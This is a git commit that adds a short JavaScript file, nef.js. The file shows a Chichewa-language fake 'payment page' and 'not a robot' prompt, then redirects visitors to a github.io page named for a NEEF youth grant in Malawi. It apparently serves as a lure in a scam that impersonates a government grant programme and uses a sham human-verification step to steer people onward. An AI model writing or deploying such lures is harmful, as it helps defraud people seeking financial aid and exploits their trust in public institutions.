5a2245d53a918ff9c577176b031153aca3519ba1
allregnws <promisebassey8081@gmail.com>
2025-05-09 23:18:06 +0100

    Create nef.js

---
+++ nef.js
@@ -0,0 +1,5 @@
+var password = 'NEEF'
+password=prompt('SMS :Takulandilani patsamba lolipira, dinani (OK) kuti muwonetsetse kuti sindinu loboti. ','NEEF');
+if (password != 'NEEF') {
+location.href='https://allregnws.github.io/NEEF.Youth.Grant.mw';
+}
